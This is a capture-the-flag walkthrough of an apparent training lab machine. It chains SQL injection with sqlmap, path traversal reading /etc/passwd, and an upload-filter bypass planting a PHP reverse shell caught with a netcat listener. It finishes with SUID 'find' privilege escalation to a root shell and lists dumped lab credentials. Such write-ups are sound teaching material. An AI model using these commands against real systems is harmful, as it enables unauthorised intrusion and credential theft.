After some enumeration, I found some directories on the webserver on port 1337:<br/>
![image](https://github.com/user-attachments/assets/d4edbd87-6078-467b-bc4a-39a657d01491)<br />
Some of them are just decoys, the real login page is at `admin_101`. <br />
![image](https://github.com/user-attachments/assets/40bbd386-3370-404e-9df8-a9df56aa1935)<br />
This login page is vulnerable to sqlinjection. I'll use sqlmap to exploit it. Open burpsuite and capture the request, then run the following command: `sqlmap -r request --dbs`, `sqlmap -r request -D expose --tables --dump`. <br />
Inside the `expose` database, I found two tables, users and config.<br />
Here's what I found:

    hacker@root.thm:VeryDifficultPassword!!#@#@!#!@#1231
    /file1010111/index.php â€” easytohack
    /upload-cv00101011/index.php
The first set of credential seems useless, let's try accessing `/file1010111/index.php`:<br />
![image](https://github.com/user-attachments/assets/ad929770-3222-426a-8e36-ecdf7ffb208c)<br />
Looking at the source code of the page, there's a hint:<br />
![image](https://github.com/user-attachments/assets/c1072135-65d0-434f-932c-1cae76972144)<br />
Before trying enumerating files, I decided to first try if it is vulnerable to path traversal, and it is! <br />
![image](https://github.com/user-attachments/assets/d7614a40-edd4-4a29-a002-342fa33b7a78)<br />
Inside the `/etc/passwd`, there's a user called `zeamkish`. If I now visit `/upload-cv00101011/index.php`, it asks for a password, with a hint suggesting that it's a user of this computer starting with letter z, which is of course `zeamkish`.<br />
This page prompts to a file upload. Looking at the source code, there's a front end filter that filters out everything that is not .png or .jpg.<br />
![image](https://github.com/user-attachments/assets/81db1e27-1f58-4155-be63-7a8b15f66eb8)<br />
But this is just a frontend filter. To bypass it we can use burpsuite and change the file extension to .php before forwarding it. I'm using the php reverse shell from pentestmonkey. <br />
![image](https://github.com/user-attachments/assets/34db6032-edde-4e64-80b6-43914d6e6906)<br />
Change the extension to .php and upload it<br />
![image](https://github.com/user-attachments/assets/2251a947-9e9c-4fd2-bdaa-c5d272f068d6)<br />
![image](https://github.com/user-attachments/assets/d7cff851-68af-4bd7-ac7c-715a9a9f6ace)<br />
So now open a netcat listener, `nc -lnvp 4444` and open `http://10.10.29.77:1337/upload-cv00101011/upload_thm_1001/rev.php`:<br />
![image](https://github.com/user-attachments/assets/b72f18c8-95d5-4b89-9e64-a9ff2ffeb469)<br />
Inside zeamkish's home directory, there are his ssh credentials:<br />
![image](https://github.com/user-attachments/assets/d879a1d8-f327-454b-a0bc-76f180bb617f)<br />
`zeamkish:easytohack@123`.<br />
I then run linpeas to enumerate possible privesc vectors and found this:<br />
![image](https://github.com/user-attachments/assets/72bcffe6-ae94-4359-b3f2-6f474fbb0f00)<br />
GTFObins is very good with this kind of SUID. Just run `find . -exec /bin/sh -p \; -quit` and get root flag!
